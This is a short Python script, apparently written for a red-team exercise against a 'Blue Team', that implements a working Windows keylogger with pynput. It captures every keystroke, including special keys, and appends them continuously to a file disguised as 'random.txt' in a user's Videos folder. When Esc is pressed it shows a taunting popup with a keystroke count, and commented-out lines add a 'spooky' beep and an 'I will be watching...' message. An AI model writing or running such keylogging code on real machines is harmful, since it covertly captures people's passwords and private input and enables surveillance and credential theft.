import pynput
import os
import ctypes
import winsound

keystroke_count = 0

# Path to save the log file
log_file_path = r"C:\Users\ZachPrice\Videos\\random.txt"

# Initialize a list
keystrokes = []

#def play_spooky_sound():
#    frequency = 750  # 750 Hertz
#    duration = 1000  # 1000 ms
#    winsound.Beep(frequency, duration)

def on_press(key):
    try:
        # Store character keys
        keystrokes.append(key.char)
#        if key.char == 's':
 #           play_spooky_sound()  # Play spooky sound
    except AttributeError:
        # Store special keys like Space, Enter, etc.
        if key == pynput.keyboard.Key.space:
            keystrokes.append(' ')  # Add a space for space key
        elif key == pynput.keyboard.Key.enter:
            keystrokes.append('\n')  # New line for Enter key
        elif key == pynput.keyboard.Key.backspace:
            keystrokes.append('[BACKSPACE]')  # Handle backspace
        else:
            keystrokes.append(f'[{str(key)}]')  # Store other special keys

def show_popup(message):
    ctypes.windll.user32.MessageBoxW(0, message, "🎃Dear Blue Team🎃", 1)

def on_release(key):
    global keystroke_count
    keystroke_count += 1

    # Write to file continuously
    with open(log_file_path, "a") as log_file:
        log_file.write(''.join(keystrokes))
        keystrokes.clear()  # Clear the list after writing to avoid duplication

    # Stop listener if Esc is pressed
    if key == pynput.keyboard.Key.esc:
        show_popup(f"Keylogger stopped! Total keystrokes: {keystroke_count}")
        return False

# Random popup
# show_popup("I will be watching...")

# Start the keylogger
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()    
